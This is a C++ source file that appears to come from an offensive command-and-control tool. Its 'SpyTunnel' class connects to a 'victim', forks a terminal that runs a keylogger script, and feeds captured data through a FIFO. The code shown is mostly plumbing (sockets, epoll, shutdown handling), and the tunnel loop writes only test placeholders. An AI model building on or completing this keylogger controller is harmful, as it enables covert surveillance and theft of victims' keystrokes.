#include "spy_tunnel.hpp"
#include <sys/eventfd.h>

int SpyTunnel::init(std::string __ip, uint __port, int*& __p_tunnel_shutdown_fd, int __connection_type) {
    ip_ = __ip;
    port_ = __port;
    memset(&tunnel_addr_, 0, sizeof(tunnel_addr_));
    tunnel_addr_.sin_family = AF_INET;
    tunnel_addr_.sin_port = htons(port_);
    if (inet_pton(AF_INET, ip_.c_str(), &tunnel_addr_.sin_addr) <= 0) {
        return -1;
    }
    tunnel_socket_ = socket(AF_INET, __connection_type, 0);

    __p_tunnel_shutdown_fd = &tunnel_shutdown_fd_.fd;

    return 0;
}

// Child process spawning the window
// Parent process will be communicating with the tunnel (victim) and forwarding packets to the fifo
void SpyTunnel::run() {
    pid_ = fork();
    if (pid_ == -1) {
        std::cerr << RED << "[SpyTunnel::run] Error creating child process" << RESET;
        return;
    } else if (pid_ == 0) {
        spawn_window();
        _exit(EXIT_FAILURE);
    }

    int tries = 0;
    while ((tunnel_fifo_ = open(KEYLOGGER_FIFO_PATH, O_WRONLY | O_NONBLOCK)) == -1 && tries++ < 20) {
        std::cout << YELLOW << "[SpyTunnel::run] Waiting for FIFO file to be created..." << RESET;
        std::this_thread::sleep_for(std::chrono::milliseconds(200));
    }

    if (tunnel_fifo_ == -1) {
        std::cerr << RED << "[SpyTunnel::run] Error opening FIFO file" << RESET;
        return;
    }
    
    ScopedEpollFD epoll_fd;
    epoll_fd.fd = epoll_create1(0);
    if (epoll_fd.fd == -1) {
        write_fifo_error("[SpyTunnel::run] Error creating epoll instance " + std::string(strerror(errno)));
        return;
    }

    tunnel_shutdown_fd_.fd = eventfd(0, EFD_NONBLOCK);
    if (tunnel_shutdown_fd_.fd == -1) {
        write_fifo_error("[SpyTunnel::run] Error creating shutdown eventfd " + std::string(strerror(errno)));
        return;
    }

    struct epoll_event shutdown_event;
    shutdown_event.data.fd = tunnel_shutdown_fd_.fd;
    shutdown_event.events = EPOLLIN;
    if (epoll_ctl(epoll_fd.fd, EPOLL_CTL_ADD, tunnel_shutdown_fd_.fd, &shutdown_event) == -1) {
        write_fifo_error("[SpyTunnel::run] Error adding shutdown eventfd to epoll " + std::string(strerror(errno)));
        return;
    }
    

    const char* test = "test\n";

    struct epoll_event events[1];
    while (true) {
        int nfds = epoll_wait(epoll_fd.fd, events, 1, 500);
        if (nfds < 0) {
            if (errno == EINTR) {
                continue;
            }
            write_fifo_error("[SpyTunnel::run] Error waiting for epoll event " + std::string(strerror(errno)));
            break;
        }

        if (nfds == 0) {
            // Timeout, simulate a test write to the FIFO
            if (tunnel_fifo_ != -1){
                write(tunnel_fifo_, test, strlen(test));
                continue;
            }
        }

        for (int i=0;i<nfds;i++) {
            if (events[i].data.fd == tunnel_shutdown_fd_.fd) {
                uint64_t u;
                read(tunnel_shutdown_fd_.fd, &u, sizeof(u));

                if (tunnel_fifo_ != -1) {
                    write(tunnel_fifo_, RESET_C2_FIFO, strlen(RESET_C2_FIFO));
                    close(tunnel_fifo_);
                }
                std::cout << MAGENTA << "[SpyTunnel::run] Shutdown signal received" << RESET;
                return;
            }
        }
    }

}

void SpyTunnel::shutdown() {
    if (pid_ > 0) {
        kill(pid_, SIGTERM);
        waitpid(pid_, nullptr, 0);
    }

    if (tunnel_socket_ != -1) {
        close(tunnel_socket_);
    }
}

void SpyTunnel::write_fifo_error(const std::string& __msg) {
    if (tunnel_fifo_ != -1) {
        std::string error = __msg + "[__error__]\n";
        write(tunnel_fifo_, error.c_str(), error.length());
    } else {
        std::cerr << RED << "[SpyTunnel::write_fifo_error] " << __msg << RESET;
    }
}

void Keylogger::spawn_window() {
    execlp("urxvt", "urxvt", "-name", "stierlitz_keylogger", "-e", KEYLOGGER_SCRIPT_PATH, (char*)NULL);
}

Tunnel::Tunnel(CommandCode __command_code, int __client_index, SpyTunnel* __p_spy_tunnel) {
    command_code_ = __command_code;
    client_index_ = __client_index;
    p_spy_tunnel_ = __p_spy_tunnel;
    p_tunnel_shutdown_fd_ = nullptr;
}

void erase_tunnel(std::vector<Tunnel>* __p_tunnels, int __client_index, CommandCode __command_code) {
    std::cout << MAGENTA << "[erase_tunnel] Erasing tunnel for client " << __client_index << " with command code " << static_cast<int>(__command_code) << RESET;
    std::cout << MAGENTA << "[erase_tunnel] Address of tunnels: " << __p_tunnels << RESET;

    auto it = std::remove_if(
        __p_tunnels->begin(), 
        __p_tunnels->end(),
        [=](Tunnel& tunnel) {
            bool should_erase = (tunnel.client_index_ == __client_index && tunnel.command_code_ == __command_code); 
            if (should_erase) {
                std::cout << MAGENTA << "[erase_tunnel] Address of spy tunnel: " << tunnel.p_spy_tunnel_ << RESET;
                delete tunnel.p_spy_tunnel_;
            }
            return should_erase;
        }
    );

    __p_tunnels->erase(it, __p_tunnels->end());
}

void SpyTunnel::spawn_window() {
    // Overridden
}